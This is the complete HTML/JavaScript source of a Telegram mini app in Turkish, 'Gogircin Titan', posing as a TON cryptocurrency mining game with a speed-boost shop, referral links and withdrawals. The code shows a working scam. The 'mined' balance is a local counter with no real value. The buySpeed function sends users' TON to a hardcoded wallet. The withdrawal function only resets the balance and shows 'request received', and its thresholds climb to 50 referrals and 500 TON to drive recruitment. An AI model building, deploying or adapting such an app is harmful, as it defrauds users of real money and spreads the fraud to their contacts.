<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Gogircin Titan</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --blue: #3b82f6; --text: #f8fafc; --green: #22c55e; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; }
        .page { display: none; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; text-align: center; padding-bottom: 100px; }
        .active { display: block; }
        .card { background: var(--card); padding: 20px; border-radius: 15px; margin-bottom: 15px; border: 1px solid #334155; }
        .btn { background: var(--blue); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; }
        .nav { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #334155; }
        .nav-item { font-size: 11px; color: #94a3b8; cursor: pointer; text-align: center; }
        #mining-icon { font-size: 60px; margin: 15px 0; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
    </style>
</head>
<body>
    <div id="p-home" class="page active">
        <div id="ton-connect" style="display: flex; justify-content: center; margin-bottom: 15px;"></div>
        <div class="card">
            <p style="color: #94a3b8; margin: 0;">Bakiyen</p>
            <h1 id="top-bal">0.0000</h1>
            <div id="mining-icon">⛏️</div>
            <p style="color: var(--blue); font-weight: bold;">⚡ <span id="pph-display">0.012</span> PPH</p>
            <button class="btn" style="background: var(--green);" id="daily-btn" onclick="claimDaily()">🎁 Günlük Bonus Al</button>
        </div>
    </div>

    <div id="p-market" class="page">
        <h2>🚀 Market</h2>
        <div class="card">
            <h3>Hız Paketi V1</h3>
            <p>+0.50 PPH | 1.9 TON</p>
            <button class="btn" onclick="buySpeed(1.9, 0.50)">Satın Al</button>
        </div>
    </div>

    <div id="p-ref" class="page">
        <h2>👥 Referans</h2>
        <div class="card">
            <input type="text" id="ref-link" readonly style="width: 100%; padding: 10px; border-radius: 8px; background: #0f172a; color: white; border: 1px solid #334155; box-sizing: border-box;">
            <button class="btn" onclick="copyRef()">Linki Kopyala</button>
        </div>
        <p>Referans Sayın: <b id="ref-count">0</b></p>
    </div>

    <div id="p-wallet" class="page">
        <h2>💰 Çekim</h2>
        <div class="card">
            <p>Bakiye: <span id="wallet-ton" style="font-weight: bold; color: var(--blue);">0.0000</span></p>
            <button class="btn" onclick="handleWithdraw()">Çekim Talebi</button>
        </div>
        <div class="card" style="text-align: left; font-size: 11px;">
            <p id="s1">✅ 1. Çekim: 1.9 TON Yatırım & 1.9 TON Min.</p>
            <p id="s2">❌ 2. Çekim: 10 Ref & 50 TON Min.</p>
            <p id="s3">❌ 3. Çekim: 50 Ref & 500 TON Min.</p>
        </div>
    </div>

    <nav class="nav">
        <div class="nav-item" onclick="showPage('p-home')">🏠<br>Home</div>
        <div class="nav-item" onclick="showPage('p-market')">🚀<br>Shop</div>
        <div class="nav-item" onclick="showPage('p-ref')">👥<br>Ref</div>
        <div class="nav-item" onclick="showPage('p-wallet')">💰<br>Wallet</div>
    </nav>

<script>
    const MY_WALLET = "UQC8qx530ORsKhEMwVVd_3UtPfjnAxKyA0DgTB1yR513oBOd";
    const tonConnectUI = new TONConnectUI.TonConnectUI({ manifestUrl: 'https://hakk2793.github.io/titan-app/tonconnect-manifest.json', buttonRootId: 'ton-connect' });

    let bal = parseFloat(localStorage.getItem('bal')) || 0;
    let pph = parseFloat(localStorage.getItem('pph')) || 0.012;
    let hasInv = localStorage.getItem('hasInv') === 'true';
    let wCount = parseInt(localStorage.getItem('wCount')) || 0;
    let rCount = parseInt(localStorage.getItem('rCount')) || 0;
    let lDaily = localStorage.getItem('lDaily') || 0;

    setInterval(() => { bal += pph / 3600; update(); localStorage.setItem('bal', bal); }, 1000);

    function update() {
        document.getElementById('top-bal').innerText = bal.toFixed(4);
        document.getElementById('wallet-ton').innerText = bal.toFixed(4);
        document.getElementById('pph-display').innerText = pph.toFixed(3);
        document.getElementById('ref-count').innerText = rCount;
        let uid = Telegram.WebApp.initDataUnsafe.user ? Telegram.WebApp.initDataUnsafe.user.id : "user";
        document.getElementById('ref-link').value = "https://t.me/Gogircin_bot?start=" + uid;
        
        let now = Date.now();
        if(now - lDaily < 86400000) {
            document.getElementById('daily-btn').disabled = true;
            document.getElementById('daily-btn').innerText = "24s Bekle";
        } else {
            document.getElementById('daily-btn').disabled = false;
            document.getElementById('daily-btn').innerText = "🎁 Günlük Bonus Al";
        }
    }

    function claimDaily() {
        if(Date.now() - lDaily >= 86400000) {
            bal += 0.015; lDaily = Date.now();
            localStorage.setItem('lDaily', lDaily);
            Telegram.WebApp.showAlert("Bonus eklendi!"); update();
        }
    }

    async function buySpeed(price, boost) {
        const tx = { validUntil: Math.floor(Date.now()/1000)+60, messages:[{address: MY_WALLET, amount:(price*1000000000).toString()}] };
        try {
            await tonConnectUI.sendTransaction(tx);
            pph += boost; hasInv = true;
            localStorage.setItem('pph', pph); localStorage.setItem('hasInv', 'true');
            Telegram.WebApp.showAlert("Yatırım Başarılı!");
        } catch(e) { Telegram.WebApp.showAlert("Hata!"); }
    }

    function handleWithdraw() {
        if(!hasInv) return Telegram.WebApp.showAlert("Önce 1.9 TON yatırım yapmalısın!");
        if(wCount == 0 && bal >= 1.9) prcW();
        else if(wCount == 1 && rCount >= 10 && bal >= 50) prcW();
        else if(wCount >= 2 && rCount >= 50 && bal >= 500) prcW();
        else Telegram.WebApp.showAlert("Şartlar sağlanmadı!");
    }

    function prcW() {
        Telegram.WebApp.showConfirm("Çekim talebi verilsin mi?", (c) => {
            if(c) { bal = 0; wCount++; localStorage.setItem('wCount', wCount); update(); Telegram.WebApp.showAlert("Talep alındı."); }
        });
    }

    function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
    function copyRef() { let el = document.getElementById('ref-link'); el.select(); document.execCommand('copy'); Telegram.WebApp.showAlert("Kopyalandı!"); }

    Telegram.WebApp.ready();
    update();
</script>
</body>
</html>
